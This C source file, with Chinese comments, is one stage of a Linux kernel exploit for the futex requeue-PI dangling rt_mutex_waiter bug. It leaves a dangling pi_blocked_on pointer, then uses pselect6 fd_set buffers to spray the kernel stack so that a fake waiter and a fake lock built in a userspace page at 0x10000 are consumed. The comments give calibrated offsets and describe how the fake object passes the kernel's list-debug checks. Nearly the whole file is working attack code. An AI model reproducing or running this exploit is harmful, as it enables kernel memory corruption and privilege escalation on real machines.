/* P2.4d: pselect6 活帧喷灌（保留 waiter +0x00..+0x1f 的自指残留）
 *
 * 关键几何（实测校准）：
 *   A 的悬空 rt_mutex_waiter = kernel_stack_top - 0x208
 *   pselect6 的 stack_fds 深度 0x190  ->  落在 waiter +0x20 起
 *     +0x20 in[0] / +0x24 in[1] / +0x28 out[0] / +0x2c out[1]
 *   故：task = out[0] = 0，lock = out[1] = 假锁地址
 *   而 +0x00..+0x1f（prio / prio_list / node_list / pi_list）保持内核自指残留
 *   -> plist_del 对 node_list 是纯空操作，能通过 __list_del_entry 的全部 debug 检查
 *
 * 判据：T 仍阻塞 = 链走消费假 waiter 并干净返回(owner=0)；T 返回 EDEADLK = 没吃到
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdint.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <time.h>

#define FUTEX_LOCK_PI 6
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI 12
#define SYS_PSELECT6 335

static int futex(uint32_t *u, int op, uint32_t val, const struct timespec *to,
                 uint32_t *u2, uint32_t val3) {
    return syscall(SYS_futex, u, op, val, to, u2, val3);
}

static uint32_t u1 = 0, u2 = 0, u3 = 0, u4 = 0;
static uint8_t *page = NULL;
static uint32_t lock_addr;
static volatile int a_ready = 0, b_locked_u2 = 0, a_blocking = 0;
static volatile int t_ret = 999, t_errno = 0;

static void build_fake(void) {
    memset(page, 0, 0x2000);
    lock_addr = (uint32_t)(uintptr_t)page;          /* 假锁在页首，地址只有 bit 位需注意 */
    uint32_t wnode = (uint32_t)(uintptr_t)(page + 0x200);

    *(uint32_t *)(page + 0x00) = 0;                 /* wait_lock = 0 */
    *(uint32_t *)(page + 0x08) = wnode + 0xc;       /* wait_list.node_list.next */
    *(uint32_t *)(page + 0x0c) = wnode + 0xc;
    *(uint32_t *)(page + 0x10) = 0;                 /* owner = 0 -> 干净退出 */

    *(uint32_t *)(page + 0x200) = 0;                /* 假 waiter prio=0 */
    *(uint32_t *)(page + 0x204) = wnode + 4;
    *(uint32_t *)(page + 0x208) = wnode + 4;
    *(uint32_t *)(page + 0x20c) = wnode + 0xc;
    *(uint32_t *)(page + 0x210) = wnode + 0xc;
    *(uint32_t *)(page + 0x228) = 0;
    *(uint32_t *)(page + 0x22c) = lock_addr;
}

/* 准备 fd：fd0 = 空 socket（读不就绪）；fd 48 = 写满的 socket（写不就绪）；
 * fd 64 只为把 fdtable 撑到 >= 65，避免 core_sys_select 把 n 截断 */
static void prep_fds(void) {
    int e[2], f[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, e) == 0) dup2(e[0], 0);
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, f) == 0) {
        int fl = fcntl(f[0], F_GETFL, 0);
        fcntl(f[0], F_SETFL, fl | O_NONBLOCK);
        static char buf[4096];
        memset(buf, 'A', sizeof buf);
        for (int i = 0; i < 8192; i++)
            if (write(f[0], buf, sizeof buf) < 0) break;
        fcntl(f[0], F_SETFL, fl);
        dup2(f[0], 48);
        dup2(f[1], 64);
    }
}

static void *thread_a(void *arg) {
    futex(&u3, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    futex(&u4, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    a_ready = 1;

    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 1; ts.tv_nsec += 500 * 1000 * 1000;
    while (ts.tv_nsec >= 1000000000) { ts.tv_sec++; ts.tv_nsec -= 1000000000; }
    futex(&u1, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &u2, 0);   /* 留下悬空 pi_blocked_on */

    a_blocking = 1;
    /* pselect6(65, in, out, NULL, NULL, NULL)
     *   in[0] = 1        -> fd 0 空 socket（读不就绪）
     *   in[1] = 0
     *   out[0] = 0       -> waiter+0x28 task = 0
     *   out[1] = lock_addr -> waiter+0x2c lock（其 bit 映射到 fd 48，写满不就绪）
     */
    static unsigned long inb[2]  = {1, 0};
    static unsigned long outb[2] = {0, 0};
    outb[1] = lock_addr;
    /* n=64 -> size=((64+31)/32)*4=8：in@+0x20, out@+0x28
     *   out[0]=+0x28=task(0)，out[1]=+0x2c=lock */
    syscall(SYS_PSELECT6, 64, inb, outb, NULL, NULL, NULL);
    for (;;) __sync_synchronize();     /* 意外返回则不再发起 syscall */
    return NULL;
}

static void *thread_b(void *arg) {
    nice(19);
    futex(&u2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    b_locked_u2 = 1;
    futex(&u3, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    return NULL;
}

static void *thread_t(void *arg) {
    while (!a_blocking) __sync_synchronize();
    usleep(250000);
    int r = futex(&u4, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    t_errno = errno; t_ret = r;
    printf("[T] LOCK_PI(u4)=%d (errno=%d)\n", r, t_errno);
    return NULL;
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("=== spray_select start pid=%d ===\n", getpid());

    /* 页地址选 0x00010000：lock=bit16 -> 仅 fd48 需就绪控制 */
    page = mmap((void *)0x00010000, 0x2000, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (page == MAP_FAILED) {
        page = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (page == MAP_FAILED) { perror("mmap"); return 1; }
    }
    printf("[M] page=%p lock=%p\n", page, page);
    build_fake();
    prep_fds();

    pthread_t ta, tb, tt;
    pthread_create(&ta, NULL, thread_a, NULL);
    while (!a_ready) __sync_synchronize();
    usleep(100000);

    pthread_create(&tb, NULL, thread_b, NULL);
    while (!b_locked_u2) usleep(200);
    usleep(200000);

    int r = futex(&u1, FUTEX_CMP_REQUEUE_PI, 1, NULL, &u2, 0);
    printf("[C] CMP_REQUEUE_PI=%d errno=%d %s\n", r, errno, errno == 35 ? "(EDEADLK 命中)" : "");

    pthread_create(&tt, NULL, thread_t, NULL);
    usleep(3500000);

    printf("[M] T ret=%d errno=%d\n", t_ret, t_errno);
    if (t_ret == 999) printf("\n*** VERDICT: T 仍阻塞 -> 假 waiter 被消费且链走干净返回 ***\n");
    else if (t_errno == 35) printf("\n*** VERDICT: T 返回 EDEADLK -> 未消费到假 waiter ***\n");
    else printf("\n*** VERDICT: T 返回 %d errno=%d ***\n", t_ret, t_errno);
    return 0;
}
